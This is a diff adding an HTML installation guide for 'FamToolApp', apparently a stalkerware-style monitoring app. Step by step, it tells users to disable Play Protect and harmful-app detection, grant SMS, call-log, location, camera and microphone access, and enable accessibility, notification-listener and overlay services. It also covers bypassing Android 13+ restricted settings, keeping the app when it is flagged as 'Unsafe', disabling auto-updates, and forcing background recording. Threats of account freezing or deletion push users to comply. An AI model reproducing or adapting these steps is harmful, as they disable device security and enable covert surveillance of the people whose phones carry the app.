@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#0a0a1a">
+    
+    <title>Installation Policy| FamToolApp</title>
+    <meta name="description" content="Mandatory installation policy for FamToolApp. Learn why enabling permissions is critical for account safety and feature usage.">
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="Policy-and-Critical.css">
+</head>
+<body>
+
+    <header class="header">
+        <div class="container header-content">
+            <a href="https://famtoolapp.com" class="logo"><span>Fam</span>ToolApp</a>
+            <button class="lang-switch" onclick="toggleLanguage()">
+                <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"></path></svg>
+                <span id="lang-btn-text">हिंदी में पढ़ें</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="container">
+        
+        <section class="policy-header">
+            <h1 class="policy-title" data-i18n="title">Installation Policy & Critical Guide</h1>
+            <p class="policy-subtitle" data-i18n="subtitle">Mandatory instructions for correct installation. Failure to follow these steps may result in feature failure or account suspension.</p>
+        </section>
+
+        <div class="warning-banner">
+            <div class="warning-icon">
+                <svg width="32" height="32" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+            </div>
+            <div>
+                <h3 style="margin: 0 0 0.5rem 0; color: var(--color-red-500);" data-i18n="warning_title">Strict Policy Warning</h3>
+                <p style="margin: 0;" data-i18n="warning_text">Our algorithm monitors service health. If permissions are deliberately disabled by the user after installation, your account may be <b>Frozen</b> or <b>Disabled</b> at any time. Refunds for paid limits will not be processed if services are inactive.</p>
+            </div>
+        </div>
+
+        <!-- Step 1: Play Protect -->
+        <div class="policy-card">
+            <div class="card-header">
+                <div class="step-num">1</div>
+                <h2 class="card-title" data-i18n="step1_title">Mandatory: Disable Play Protect First</h2>
+            </div>
+            <p data-i18n="step1_desc">Before installing the application, you <b>MUST</b> go to the Google Play Store and disable "Play Protect". If this is not done, the operating system will uninstall the app automatically.</p>
+            
+            <div class="graphic-container">
+                <div class="phone-screen">
+                    <div style="text-align: center; margin-bottom: 10px; font-weight: bold; color:white;">Google Play Store Settings</div>
+                    <div class="setting-row">
+                        <div style="font-size: 12px;">Scan apps with Play Protect</div>
+                        <div class="toggle-switch"></div> <!-- Off State -->
+                    </div>
+                    <div class="setting-row">
+                        <div style="font-size: 12px;">Improve harmful app detection</div>
+                        <div class="toggle-switch"></div> <!-- Off State -->
+                    </div>
+                    <div style="text-align: center; font-size: 10px; color: var(--color-red-500); margin-top: 5px;" data-i18n="graphic_off">Both must be OFF</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Login Activity Permissions -->
+        <div class="policy-card">
+            <div class="card-header">
+                <div class="step-num">2</div>
+                <h2 class="card-title" data-i18n="step2_title">Login Activity: Initial Permissions</h2>
+            </div>
+            <p data-i18n="step2_desc">During the login process (Login Activity), the app will request runtime permissions. You must click <b>"Allow"</b> or <b>"While using the app"</b> for all requests.</p>
+            <ul style="list-style: none; padding: 0;">
+                <li style="margin-bottom: 10px; display: flex; align-items: center; gap: 10px;">
+                    <svg width="20" height="20" color="var(--color-green-500)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    <span data-i18n="perm_location">Location (Precise)</span>
+                </li>
+                <li style="margin-bottom: 10px; display: flex; align-items: center; gap: 10px;">
+                    <svg width="20" height="20" color="var(--color-green-500)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    <span data-i18n="perm_sms">SMS & Call Logs</span>
+                </li>
+                <li style="margin-bottom: 10px; display: flex; align-items: center; gap: 10px;">
+                    <svg width="20" height="20" color="var(--color-green-500)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    <span data-i18n="perm_camera">Camera & Microphone</span>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Step 3: Child Activity Services -->
+        <div class="policy-card">
+            <div class="card-header">
+                <div class="step-num">3</div>
+                <h2 class="card-title" data-i18n="step3_title">Child Activity: System Services</h2>
+            </div>
+            <p data-i18n="step3_desc">In the final setup screen (Child Activity), you will see a list of switches. You must tap each one and <b>Enable</b> the service in the Android Settings that open up.</p>
+            
+            <div class="graphic-container">
+                <div class="phone-screen">
+                    <div class="setting-row">
+                        <div style="font-size: 12px;">Accessibility Service</div>
+                        <div class="toggle-switch on"></div>
+                    </div>
+                    <div class="setting-row">
+                        <div style="font-size: 12px;">Notification Listener</div>
+                        <div class="toggle-switch on"></div>
+                    </div>
+                    <div class="setting-row">
+                        <div style="font-size: 12px;">Display Over Other Apps</div>
+                        <div class="toggle-switch on"></div>
+                    </div>
+                </div>
+                <p style="font-size: 12px; margin-top: 10px; color: var(--color-purple-400);" data-i18n="graphic_all_on">ALL Must be Enabled (Green)</p>
+            </div>
+        </div>
+
+        <!-- Step 4: The Accessibility Trick -->
+        <div class="policy-card" style="border-color: var(--color-purple-500);">
+            <div class="card-header">
+                <div class="step-num">4</div>
+                <h2 class="card-title" data-i18n="step4_title">Critical Fix: Camera/Audio Recording</h2>
+            </div>
+            <p><b class="danger-text" data-i18n="attention">ATTENTION:</b> <span data-i18n="step4_desc">Android systems often block background recording even if permissions are given. To fix this, you must perform this specific action for the 'FamToolApp' Accessibility Service:</span></p>
+            
+            <div class="action-sequence-box">
+                <h3 data-i18n="action_sequence">The Action Sequence</h3>
+                <div class="action-steps">
+                    <span class="on-text">ON</span>
+                    <span class="arrow">➝</span>
+                    <span class="off-text">OFF</span>
+                    <span class="arrow">➝</span>
+                    <span class="on-text">ON (Again)</span>
+                </div>
+                <p class="action-note" data-i18n="step4_note">Go to Settings > Accessibility > Installed Apps > FamToolApp. Turn it OFF, wait 2 seconds, then Turn it ON again. This resets the system flag.</p>
+            </div>
+        </div>
+
+        <!-- Step 5: Harmful App Detection & Auto Update (UPDATED) -->
+        <div class="policy-card">
+            <div class="card-header">
+                <div class="step-num">5</div>
+                <h2 class="card-title" data-i18n="step5_title">Troubleshooting: 'Harmful App' / Disabled?</h2>
+            </div>
+            <p data-i18n="step5_desc">Play Protect might identify this app as "Harmful" because it monitors device activity. It may <b>Disable</b> the app automatically. You MUST check Play Protect settings to re-enable it.</p>
+            
+            <div class="graphic-container">
+                <!-- Harmful App Simulation -->
+                <div class="phone-screen" style="margin-bottom: 15px;">
+                    <div style="text-align: center; margin-bottom: 5px; font-weight: bold; color:white;">Play Protect Status</div>
+                    
+                    <div class="alert-box">
+                        <div class="alert-title">
+                            <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                            <span data-i18n="graphic_harmful">Harmful app disabled</span>
+                        </div>
+                        <div style="font-size: 11px; color: #d1d5db;">FamToolApp</div>
+                        <div class="alert-btn" data-i18n="graphic_enable_btn">ENABLE APP</div>
+                    </div>
+                </div>
+
+                <!-- Instructions -->
+                <ul style="text-align: left; margin-top: 5px; font-size: 0.9rem; color: var(--color-gray-300);">
+                    <li data-i18n="fix_step1">Go to <b>Play Store > Play Protect</b>. Look for "Harmful apps disabled".</li>
+                    <li data-i18n="fix_step2">Tap on "FamToolApp" or "Enable". If asked, select <b>"Keep App (Unsafe)"</b>.</li>
+                    <li data-i18n="fix_step3"><b>Finally:</b> Turn OFF "Scan apps" and Go to Settings > Network > Auto-update > <b>"Don't auto-update"</b>.</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Step 6: Android 13+ Restricted Settings -->
+        <div class="policy-card">
+            <div class="card-header">
+                <div class="step-num">6</div>
+                <h2 class="card-title" data-i18n="step6_title">Android 13+ Setup: Restricted Settings</h2>
+            </div>
+            <p data-i18n="step6_desc">On Android 13, 14 & 15, enabling Accessibility is blocked by default ('Restricted Setting'). You must manually allow it from the App Info menu.</p>
+            
+            <div class="graphic-container">
+                <div class="phone-screen">
+                    <!-- App Info Header -->
+                    <div class="app-info-header">
+                        <div style="font-size: 14px; font-weight: 600;">App info</div>
+                        <div class="three-dots-icon">
+                            <span></span><span></span><span></span>
+                        </div>
+                    </div>
+
+                    <!-- App Icon Mockup -->
+                    <div class="app-info-hero">
+                        <div class="app-icon-large">F</div>
+                        <div style="font-size: 16px; font-weight: bold; margin-top: 5px;">FamToolApp</div>
+                        <div style="font-size: 10px; color: var(--color-gray-400);">Version 1.0.0</div>
+                    </div>
+
+                    <!-- Popup Menu Simulation -->
+                    <div class="restricted-menu-popup">
+                        <div class="menu-item-fake">Mask notifications</div>
+                        <div class="menu-item-fake highlight-pulse" data-i18n="graphic_allow_restricted">Allow restricted settings</div>
+                    </div>
+                    
+                    <!-- Hand Pointer Animation -->
+                    <div class="hand-cursor">
+                        <svg viewBox="0 0 24 24" fill="white" width="30" height="30"><path d="M9 11.24V7.5C9 6.12 10.12 5 11.5 5S14 6.12 14 7.5v3.74c1.21-.81 2-2.18 2-3.74C16 5.01 13.99 3 11.5 3S7 5.01 7 7.5c0 2.41 1.45 4.49 3.5 5.28v-1.54z"></path><path d="M18 10.5c-1.29 0-2.43.64-3.14 1.63L13 11V7.5C13 6.67 12.33 6 11.5 6S10 6.67 10 7.5v8.16l-2.8-1.4c-.16-.07-.32-.09-.49-.09-.34 0-.66.14-.88.42l-.83 1.07L9.54 21.6c.41 1.09 1.48 1.9 2.71 1.9H16c1.66 0 3-1.34 3-3v-7c0-1.66-1.34-3-3-3z"></path></svg>
+                    </div>
+                </div>
+            </div>
+
+            <ul style="margin-top: 15px;">
+                <li data-i18n="step6_list1">1. Open 'App Info' for FamToolApp</li>
+                <li data-i18n="step6_list2">2. Tap the 3-dots menu (Top Right)</li>
+                <li data-i18n="step6_list3">3. Select 'Allow restricted settings'</li>
+            </ul>
+        </div>
+
+        <!-- Step 7: Gmail Verification (New) -->
+        <div class="policy-card" style="border-color: var(--color-red-500);">
+            <div class="card-header">
+                <div class="step-num">7</div>
+                <h2 class="card-title" data-i18n="step7_title">Mandatory: Verify Gmail</h2>
+            </div>
+            <p><b class="danger-text" data-i18n="important_notice">IMPORTANT:</b> <span data-i18n="step7_desc">If you do not verify your Gmail address, your account may be PERMANENTLY DELETED at any time. It is mandatory to complete verification to keep your account active.</span></p>
+            
+            <div class="graphic-container" style="background: rgba(239, 68, 68, 0.1); border-color: var(--color-red-500);">
+                <div style="text-align: center; padding: 20px;">
+                    <div class="email-pulse-icon-container">
+                        <svg class="email-pulse-icon" width="48" height="48" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                    </div>
+                    <p style="margin-top: 20px; font-weight: 800; color: var(--color-red-500); font-size: 1.2rem; text-transform: uppercase; letter-spacing: 1px;" data-i18n="graphic_verify">VERIFY EMAIL NOW</p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 FamToolApp. All Rights Reserved.</p>
+            <p style="font-size: 0.8rem; color: var(--color-gray-400);">
+                <a href="https://famtoolapp.com/Privacy-Policy.html">Privacy Policy</a> | 
+                <a href="https://famtoolapp.com/Terms-and-Conditions.html">Terms</a> |
+                <a href="https://famtoolapp.com/Installation-Guide.html">Install Guide</a>
+            </p>
+        </div>
+    </footer>
+
+    <script src="Policy-and-Critical.js"></script>
+</body>
+</html>
